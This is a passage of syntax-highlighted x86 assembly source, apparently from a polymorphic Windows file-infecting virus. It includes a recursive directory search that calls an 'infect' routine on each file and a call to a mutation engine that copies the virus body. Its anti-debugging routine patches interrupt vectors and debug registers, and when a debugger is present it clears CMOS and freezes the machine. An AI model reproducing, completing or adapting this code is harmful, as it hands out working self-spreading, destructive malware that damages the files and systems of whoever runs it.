                </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">                          </span><span class="sc1">;for full directory name</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;esi=offset of dirname</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;edi=memory for FULL dirname</span><span class="sc0">

</span><span class="sc5">_scopy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                </span><span class="sc1">;end of ASCIIZ string?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_scopy</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'                              ;add '</span><span class="sc0">\</span><span class="sc13">' if need
</span><span class="sc0">                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_estislesh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">_estislesh</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;esi=position for file/dir</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'*.*'</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;restore edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFile</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;eax=handle for search</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">ff_quit</span><span class="sc0">                           </span><span class="sc1">;cmp eax,-1</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;search handle</span><span class="sc0">

</span><span class="sc5">ff_infect</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;pause</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000000</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">


                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;edi=position of file/dir,esi=ff_struc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.ff_fullname</span><span class="sc0">               </span><span class="sc1">;esi=finded name</span><span class="sc0">
</span><span class="sc5">_sadd</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;string add</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_sadd</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;FULL name of file/dir</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_attr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">ff_dir</span><span class="sc0">                            </span><span class="sc1">;dir?</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">infect</span><span class="sc0">                            </span><span class="sc1">;no dir,infect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_next</span><span class="sc0">

</span><span class="sc5">ff_dir</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_fullname</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">ff_next</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">filefind</span><span class="sc0">

</span><span class="sc5">ff_next</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFile</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">ff_infect</span><span class="sc0">                         </span><span class="sc1">;no dirs/files?</span><span class="sc0">

</span><span class="sc5">ff_quit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">filefind</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;In  : edi=bufer</span><span class="sc0">
</span><span class="sc1">;Out : ecx=size generated</span><span class="sc0">
</span><span class="sc1">;modify :eax,edx,ecx</span><span class="sc0">
</span><span class="sc5">call_NPE32</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Debuger_fuckup</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cpuid</span><span class="sc0">                                   </span><span class="sc1">;get unical value</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;for this CPU</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;move it in flags</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">runSeed</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;seed (or NULL)</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">runSeed</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;seed has been</span><span class="sc0">
                                                        </span><span class="sc1">;inicialized == NULL</span><span class="sc0">

</span><span class="sc5">_push_size</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PHYSICAL_SIZE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;size</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;bufer</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;data</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;int NPE_main(</span><span class="sc0">
</span><span class="sc1">;      offset data</span><span class="sc0">
</span><span class="sc1">;      offset bufer</span><span class="sc0">
</span><span class="sc1">;      count_bytes</span><span class="sc0">
</span><span class="sc1">;      seed (nul if not 1st generation)</span><span class="sc0">
</span><span class="sc1">;      flags</span><span class="sc0">
</span><span class="sc1">;      )</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">npe_main</span><span class="sc0">                           </span><span class="sc1">;out eax=size</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">e_call_npe32</span><span class="sc0">                       </span><span class="sc1">;if no errors</span><span class="sc0">

</span><span class="sc1">;----------------               error              ------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PHYSICAL_SIZE</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;data</span><span class="sc0">
                </span><span class="sc1">;edi = bufer</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy virii to bufer</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">e_call_npe32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">call_NPE32</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">


</span><span class="sc5">GetMem</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAlloc</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;GetMemory</span><span class="sc0">
                </span><span class="sc1">;eax=offset of getted memory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp._eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">GetMem</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Input:ecx=field of rounding</span><span class="sc0">
</span><span class="sc1">;      eax=size</span><span class="sc0">
</span><span class="sc5">Round</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">bsr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Scan backward for bit</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">Round</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">__ebx</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov ebx,polinom</span><span class="sc0">
                </span><span class="sc5">polinom</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04c11db7h</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">next_8_bites</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">carry_find</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shld</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">not_carry</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">not_carry</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">carry_find</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_8_bites</span><span class="sc0">


                </span><span class="sc1">;add null bites</span><span class="sc0">

                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@carry_find</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@not_carry</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">@not_carry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@carry_find</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp._eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">;return CRc in eax</span><span class="sc0">

                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">replace</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;=== copy old jumper to table===</span><span class="sc0">
</span><span class="sc1">;ecx=#of finded</span><span class="sc0">
</span><span class="sc1">;edi=offst of command(cor)</span><span class="sc0">
</span><span class="sc1">;ebx=offset of commnd(phys)</span><span class="sc0">
</span><span class="sc1">;esi=setted virtual offset</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[(</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp_table</span><span class="sc4">)+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;num in table</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b050h</span><span class="sc0">                   </span><span class="sc1">;push eax+mov al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

       </span><span class="sc1">;ecx=count/index</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;eax=num records param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                      </span><span class="sc1">;jmp.....</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;VO</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">;Pa3Huya</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">






</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc5">randomGen</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;save max_random</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                                 </span><span class="sc1">;mov eax,xxxxxxxx</span><span class="sc0">
                </span><span class="sc5">__seed</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">134775813</span><span class="sc0">                       </span><span class="sc1">;eax=new seed</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;EDX:EAX=EAX*EDI</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__seed</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">;max_random=0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__div_0</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp._eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">__div_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">randomGen</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc5">Debuger_fuckup</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IsDebuggerPresent</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;catch stupid TD32 ;)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fuckup</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;kill int 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;kill int 3</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;kill debug system regs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;NOTE:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr2</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;  SoftIce is interrupts</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr3</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;  this commands &amp;</span><span class="sc0">
                                                        </span><span class="sc1">;  virii suck.</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">fuckup</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5eh</span><span class="sc0">                            </span><span class="sc1">;Clear CMOS</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PM_out</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PM_out</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc5">PM_out</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc0">                       </span><span class="sc1">;WRITE_PORT_UCHAR</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">
